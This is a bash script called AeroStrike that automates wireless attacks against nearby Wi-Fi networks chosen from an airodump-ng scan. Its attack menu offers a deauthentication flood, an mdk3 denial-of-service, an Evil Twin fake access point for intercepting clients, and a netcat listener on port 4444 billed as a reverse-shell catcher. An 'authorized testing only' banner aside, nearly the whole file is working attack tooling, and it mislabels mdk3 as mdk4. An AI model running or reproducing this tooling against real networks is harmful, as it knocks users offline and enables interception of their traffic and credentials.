#!/bin/bash

#===============================================================
#   AeroStrike - WiFi Attack Automation Suite for Kali Linux
#   Version: 1.0
#   Author: You
#   Disclaimer: FOR AUTHORIZED PENETRATION TESTING ONLY.
#===============================================================

# Colors
RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[1;33m"
CYAN="\033[0;36m"
RESET="\033[0m"

# Banner
banner() {
clear
echo -e "${CYAN}
    ╔══════════════════════════════════════════╗
    ║            AeroStrike v1.0              ║
    ║  Automated Wi-Fi Penetration Platform   ║
    ║     For Authorized Use Only             ║
    ╚══════════════════════════════════════════╝
${RESET}"
}

# Dependency check
check_dependencies() {
    echo -e "${CYAN}[*] Checking dependencies...${RESET}"
    dependencies=("airmon-ng" "aireplay-ng" "airodump-ng" "mdk3" "airbase-ng" "iwconfig" "nc")
    missing=()

    for dep in "${dependencies[@]}"; do
        printf "${YELLOW}Checking: %-12s ...${RESET} " "$dep"
        sleep 0.2
        if ! command -v $dep &>/dev/null; then
            echo -e "${RED}Missing${RESET}"
            missing+=("$dep")
        else
            echo -e "${GREEN}Installed${RESET}"
        fi
    done

    if [ ${#missing[@]} -ne 0 ]; then
        echo -e "\n${YELLOW}[!] Installing missing packages...${RESET}"
        for pkg in "${missing[@]}"; do
            echo -e "${CYAN}Installing: $pkg${RESET}"
            sudo apt-get install -y $pkg &>/dev/null
            if command -v $pkg &>/dev/null; then
                echo -e "${GREEN}Success: $pkg installed${RESET}"
            else
                echo -e "${RED}Failed to install $pkg${RESET}"
            fi
        done
    else
        echo -e "\n${GREEN}[+] All dependencies are satisfied.${RESET}"
    fi
    sleep 1
}

# Interface selection
select_interface() {
    echo -e "${CYAN}[*] Available wireless interfaces:${RESET}"
    iw dev | awk '$1=="Interface"{print $2}'
    read -p "${CYAN}Enter the interface to use (e.g., wlan0): ${RESET}" interface
    sudo airmon-ng start $interface &>/dev/null
    interface="${interface}mon"
    echo -e "${GREEN}[+] Using interface: $interface${RESET}"
}

# Target selection
select_target() {
    tmpfile="targets.csv"
    echo "${CYAN}[Scanning nearby Wi-Fi networks... Press Ctrl+C after 10s to stop]${RESET}"
    sleep 1
    sudo airodump-ng $interface --band abg --output-format csv -w scan_output &> /dev/null &
    pid=$!
    sleep 10
    kill $pid 2>/dev/null

    if [ ! -f scan_output-01.csv ]; then
        echo "${RED}Scan failed or no networks found.${RESET}"
        return 1
    fi

    echo "${GREEN}Available Targets:${RESET}"
    grep -aE "([A-F0-9]{2}:){5}[A-F0-9]{2}" scan_output-01.csv |     awk -F',' 'BEGIN{count=0}
        /^[[:space:]]*([A-F0-9]{2}:){5}[A-F0-9]{2}/ {
            gsub(/^ +| +$/, "", $1);
            gsub(/^ +| +$/, "", $4);
            gsub(/^ +| +$/, "", $14);
            printf("%03d) BSSID: %-17s | Channel: %-2s | ESSID: %s\n", count++, $1, $4, $14)
            targets[count]=$1 ";" $4 ";" $14
        }
        END {
            for (i=1; i<=count; i++) print targets[i] > "'$tmpfile'"
        }'

    echo
    read -p "${CYAN}Enter target number: ${RESET}" choice
    selected=$(sed -n "$((choice + 1))p" $tmpfile)

    if [ -z "$selected" ]; then
        echo "${RED}Invalid selection.${RESET}"
        return 1
    fi

    IFS=';' read -r bssid channel essid <<< "$selected"
    echo -e "${YELLOW}Selected: BSSID=$bssid | Channel=$channel | ESSID=$essid${RESET}"

    attack_menu "$bssid" "$channel" "$essid"
}

# Attack options menu
attack_menu() {
    local bssid="$1"
    local channel="$2"
    local essid="$3"

    echo -e "\n${CYAN}Select Attack Type:${RESET}"
    echo "1) Quick Deauth Attack (2.4GHz)"
    echo "2) Quick DoS (5GHz mdk4)"
    echo "3) Evil Twin (Fake AP)"
    echo "4) Reverse Shell Payload"
    echo "5) Cancel"
    read -p "${YELLOW}Choice: ${RESET}" attack_choice

    case $attack_choice in
        1)
            echo -e "${CYAN}Launching deauth attack...${RESET}"
            sudo iwconfig $interface channel $channel
            sudo aireplay-ng --deauth 100 -a $bssid $interface
            ;;
        2)
            echo -e "${CYAN}Launching mdk4 DoS attack...${RESET}"
            sudo mdk3 $interface d -c $channel -b $bssid
            ;;
        3)
            echo -e "${CYAN}Setting up Evil Twin AP...${RESET}"
            sudo airbase-ng -e "$essid" -c $channel $interface
            ;;
        4)
            echo -e "${CYAN}Starting reverse shell payload listener on port 4444...${RESET}"
            nc -lvnp 4444
            ;;
        *)
            echo "${RED}Cancelled.${RESET}"
            ;;
    esac
}

# Main Menu
main_menu() {
    while true; do
        echo -e "\n${CYAN}=========== AeroStrike Main Menu ===========${RESET}"
        echo "1) Check Dependencies"
        echo "2) Select Interface"
        echo "3) Scan & Attack Wi-Fi Network"
        echo "4) Exit"
        read -p "${YELLOW}Choose an option: ${RESET}" opt
        case $opt in
            1) check_dependencies ;;
            2) select_interface ;;
            3) select_target ;;
            4) echo -e "${CYAN}Exiting. Stay legal.${RESET}"; exit 0 ;;
            *) echo -e "${RED}Invalid option.${RESET}" ;;
        esac
    done
}

# Run
banner
check_dependencies
main_menu
